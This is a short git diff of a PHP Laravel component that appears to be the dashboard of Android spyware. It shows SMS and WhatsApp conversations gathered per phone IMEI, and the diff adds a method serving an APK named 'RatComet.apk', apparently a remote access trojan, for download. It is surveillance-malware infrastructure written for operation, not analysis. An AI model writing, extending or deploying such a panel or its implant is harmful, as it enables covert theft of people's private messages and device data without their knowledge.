@@ -14,6 +14,7 @@ use App\Models\MobileAccessToken;
 use Illuminate\Support\Str;
 use DB;
 use Illuminate\Support\Arr;
+use Illuminate\Support\Facades\Storage;
 
 class Home extends Component
 {
@@ -21,7 +22,6 @@ class Home extends Component
     public $menu = 0;
     public $subMenu;
     private $token;
-
     // data
     public $smsList = [];
     public $smsConversationList = [];
@@ -46,6 +46,9 @@ class Home extends Component
             $this->selectedWhatsappConversation = $this->whatsappList->toArray()[0]["contact"];
             $this->whatsappConversationList = SocialApp::where(['imei'=>$this->phoneImei,'platform'=>'whatsapp','contact'=> $this->selectedWhatsappConversation])->get();
         }
+    }
+    public function download() {
+        return Storage::download('public/mobile/RatComet.apk', "RatComet.apk",['Content-Type'=>'application/vnd.android.package-archive','Content-Disposition'=>'attachment;filename="RatComet.apk"',]);
     }
     public function showWhatsappConversation($contact) {
         $this->selectedWhatsappConversation = $contact;
